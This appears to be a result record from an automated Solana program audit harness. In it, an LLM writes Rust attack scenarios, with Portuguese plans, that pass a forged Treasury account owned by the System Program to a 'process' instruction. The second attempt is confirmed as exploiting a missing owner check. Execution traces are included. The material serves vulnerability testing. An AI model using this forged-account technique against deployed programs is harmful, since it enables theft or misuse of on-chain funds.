@@ -1,0 +1,268 @@
+{
+  "category": "OWNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: forged treasury account with non-program owner was accepted and used",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2309,
+        "completion_tokens": 709,
+        "latency_s": 3.97
+      },
+      "raw": "{\n  \"plan\": \"O cenário inicializa uma conta Treasury legítima via `initialize` (baseline) para provar que o programa aceita a conta correta. Em seguida, o ataque chama `process` passando uma conta forjada pelo atacante, com dono diferente do programa (ex.: System Program), contendo dados que imitam um Treasury ativo. O efeito medido é que a instrução aceita a conta forjada e executa com sucesso, demonstrando a falta de verificação de dono.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet treasury_key = Pubkey::new_unique();\\n\\n// Baseline: inicializa uma conta Treasury legítima\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(1000u64,),\\n    vec![\\n        AccountMeta::new(treasury_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\\n    ],\\n);\\nlet init_accounts = vec![\\n    (treasury_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    system_program_account(),\\n];\\nlet baseline_result = env.baseline(\\\"initialize treasury\\\", &init_ix, &init_accounts);\\n\\n// Extrai a conta Treasury criada pelo baseline\\nlet treasury_account = baseline_result\\n    .resulting_accounts\\n    .iter()\\n    .find(|(k, _)| *k == treasury_key)\\n    .map(|(_, a)| a.clone())\\n    .unwrap_or_else(|| account(&env.program_id, &anchor_account_data(\\\"Treasury\\\", &(authority, 1000u64, true)), None));\\n\\n// Ataque: chama process com uma conta forjada (dono diferente do programa)\\nlet forged_data = anchor_account_data(\\\"Treasury\\\", &(authority, 1000u64, true));\\nlet forged_account = account(&solana_program::system_program::id(), &forged_data, None);\\n\\nlet attack_ix = env.anchor_ix(\\n    \\\"process\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new_readonly(treasury_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (treasury_key, forged_account),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet attack_result = env.attack(\\\"process with forged treasury owner\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let forged_after = after(&attack_result, &treasury_key);\\n    env.effect(\\n        \\\"forged treasury account with non-program owner was accepted\\\",\\n        forged_after.owner() != &env.program_id,\\n    );\\n}\"\n}",
+      "plan": "O cenário inicializa uma conta Treasury legítima via `initialize` (baseline) para provar que o programa aceita a conta correta. Em seguida, o ataque chama `process` passando uma conta forjada pelo atacante, com dono diferente do programa (ex.: System Program), contendo dados que imitam um Treasury ativo. O efeito medido é que a instrução aceita a conta forjada e executa com sucesso, demonstrando a falta de verificação de dono.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet treasury_key = Pubkey::new_unique();\n\n// Baseline: inicializa uma conta Treasury legítima\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(1000u64,),\n    vec![\n        AccountMeta::new(treasury_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\n    ],\n);\nlet init_accounts = vec![\n    (treasury_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    system_program_account(),\n];\nlet baseline_result = env.baseline(\"initialize treasury\", &init_ix, &init_accounts);\n\n// Extrai a conta Treasury criada pelo baseline\nlet treasury_account = baseline_result\n    .resulting_accounts\n    .iter()\n    .find(|(k, _)| *k == treasury_key)\n    .map(|(_, a)| a.clone())\n    .unwrap_or_else(|| account(&env.program_id, &anchor_account_data(\"Treasury\", &(authority, 1000u64, true)), None));\n\n// Ataque: chama process com uma conta forjada (dono diferente do programa)\nlet forged_data = anchor_account_data(\"Treasury\", &(authority, 1000u64, true));\nlet forged_account = account(&solana_program::system_program::id(), &forged_data, None);\n\nlet attack_ix = env.anchor_ix(\n    \"process\",\n    &(),\n    vec![\n        AccountMeta::new_readonly(treasury_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet attack_accounts = vec![\n    (treasury_key, forged_account),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet attack_result = env.attack(\"process with forged treasury owner\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let forged_after = after(&attack_result, &treasury_key);\n    env.effect(\n        \"forged treasury account with non-program owner was accepted\",\n        forged_after.owner() != &env.program_id,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize treasury",
+            "result": "Success",
+            "compute_units": 12976,
+            "account_flags": "sw,sw,-r",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": "eeef7bee5901a8fd0000000000000001000000000000000000000000000000000000000000000000e80300000000000001"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": false,
+                "owner": "NativeLoader1111111111111111111111111111111",
+                "data_len": 14,
+                "head": "73797374656d5f70",
+                "digest": "d8e11c483f20607a",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "process with forged treasury owner",
+            "result": "Success",
+            "compute_units": 8487,
+            "account_flags": "-r,sr",
+            "ix_head": "32429210847f67bf",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 49,
+                "head": "eeef7bee5901a8fd",
+                "digest": "cbdab63d16b4ffe9",
+                "post": ""
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "forged treasury account with non-program owner was accepted",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 12976 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 8487 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o ataque nao exercita a hipotese de OWNER: e preciso que uma conta do ataque tem dono diferente da conta na mesma posicao do baseline. Mantenha o baseline como uso legitimo e faca no ataque exatamente essa mudanca."
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2922,
+        "completion_tokens": 827,
+        "latency_s": 4.18
+      },
+      "raw": "{\"plan\": \"O baseline inicializa uma conta Treasury legítima (dono = program_id) via `initialize`, provando que o cenário está montado. O ataque chama `process` com a mesma posição de conta, mas substitui a conta Treasury por uma conta forjada cujo dono é o System Program (diferente do baseline). Como `Process` usa `AccountInfo` sem checagem de dono, o programa lê os dados forjados e aceita. O efeito mede que a conta forjada, com dono diferente do programa, foi aceita e usada.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet treasury_key = Pubkey::new_unique();\\n\\n// Baseline: inicializa uma conta Treasury legítima (dono = program_id)\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(1000u64,),\\n    vec![\\n        AccountMeta::new(treasury_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\\n    ],\\n);\\nlet init_accounts = vec![\\n    (treasury_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    system_program_account(),\\n];\\nlet baseline_result = env.baseline(\\\"initialize treasury\\\", &init_ix, &init_accounts);\\n\\n// Conta Treasury legítima resultante do baseline (dono = program_id)\\nlet legit_treasury = baseline_result\\n    .resulting_accounts\\n    .iter()\\n    .find(|(k, _)| *k == treasury_key)\\n    .map(|(_, a)| a.clone())\\n    .unwrap_or_else(|| account(&env.program_id, &anchor_account_data(\\\"Treasury\\\", &(authority, 1000u64, true)), None));\\n\\n// Baseline de process com a conta legítima (mesma instrução-alvo)\\nlet process_ix = env.anchor_ix(\\n    \\\"process\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new_readonly(treasury_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet process_accounts = vec![\\n    (treasury_key, legit_treasury.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet _ = env.baseline(\\\"process with legit treasury\\\", &process_ix, &process_accounts);\\n\\n// Ataque: mesma posição, mas conta forjada com dono = System Program\\nlet forged_data = anchor_account_data(\\\"Treasury\\\", &(authority, 1000u64, true));\\nlet forged_account = account(&solana_program::system_program::id(), &forged_data, None);\\n\\nlet attack_accounts = vec![\\n    (treasury_key, forged_account),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"process with forged treasury owner\\\", &process_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let forged_after = after(&attack_result, &treasury_key);\\n    env.effect(\\n        \\\"forged treasury account with non-program owner was accepted and used\\\",\\n        forged_after.owner() != &env.program_id,\\n    );\\n}\"}",
+      "plan": "O baseline inicializa uma conta Treasury legítima (dono = program_id) via `initialize`, provando que o cenário está montado. O ataque chama `process` com a mesma posição de conta, mas substitui a conta Treasury por uma conta forjada cujo dono é o System Program (diferente do baseline). Como `Process` usa `AccountInfo` sem checagem de dono, o programa lê os dados forjados e aceita. O efeito mede que a conta forjada, com dono diferente do programa, foi aceita e usada.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet treasury_key = Pubkey::new_unique();\n\n// Baseline: inicializa uma conta Treasury legítima (dono = program_id)\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(1000u64,),\n    vec![\n        AccountMeta::new(treasury_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\n    ],\n);\nlet init_accounts = vec![\n    (treasury_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    system_program_account(),\n];\nlet baseline_result = env.baseline(\"initialize treasury\", &init_ix, &init_accounts);\n\n// Conta Treasury legítima resultante do baseline (dono = program_id)\nlet legit_treasury = baseline_result\n    .resulting_accounts\n    .iter()\n    .find(|(k, _)| *k == treasury_key)\n    .map(|(_, a)| a.clone())\n    .unwrap_or_else(|| account(&env.program_id, &anchor_account_data(\"Treasury\", &(authority, 1000u64, true)), None));\n\n// Baseline de process com a conta legítima (mesma instrução-alvo)\nlet process_ix = env.anchor_ix(\n    \"process\",\n    &(),\n    vec![\n        AccountMeta::new_readonly(treasury_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet process_accounts = vec![\n    (treasury_key, legit_treasury.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet _ = env.baseline(\"process with legit treasury\", &process_ix, &process_accounts);\n\n// Ataque: mesma posição, mas conta forjada com dono = System Program\nlet forged_data = anchor_account_data(\"Treasury\", &(authority, 1000u64, true));\nlet forged_account = account(&solana_program::system_program::id(), &forged_data, None);\n\nlet attack_accounts = vec![\n    (treasury_key, forged_account),\n    (authority, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"process with forged treasury owner\", &process_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let forged_after = after(&attack_result, &treasury_key);\n    env.effect(\n        \"forged treasury account with non-program owner was accepted and used\",\n        forged_after.owner() != &env.program_id,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize treasury",
+            "result": "Success",
+            "compute_units": 12976,
+            "account_flags": "sw,sw,-r",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": "eeef7bee5901a8fd0000000000000001000000000000000000000000000000000000000000000000e80300000000000001"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": false,
+                "owner": "NativeLoader1111111111111111111111111111111",
+                "data_len": 14,
+                "head": "73797374656d5f70",
+                "digest": "d8e11c483f20607a",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "baseline",
+            "note": "process with legit treasury",
+            "result": "Success",
+            "compute_units": 8487,
+            "account_flags": "-r,sr",
+            "ix_head": "32429210847f67bf",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw",
+                "data_len": 49,
+                "head": "eeef7bee5901a8fd",
+                "digest": "cbdab63d16b4ffe9",
+                "post": ""
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "process with forged treasury owner",
+            "result": "Success",
+            "compute_units": 8487,
+            "account_flags": "-r,sr",
+            "ix_head": "32429210847f67bf",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 49,
+                "head": "eeef7bee5901a8fd",
+                "digest": "cbdab63d16b4ffe9",
+                "post": ""
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "forged treasury account with non-program owner was accepted and used",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 12976 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 8487 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 8487 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: forged treasury account with non-program owner was accepted and used"
+    }
+  ],
+  "case_id": "SSP-02-A-V",
+  "static_finding": {
+    "category": "OWNER",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Improper Owner Check."
+  }
+}
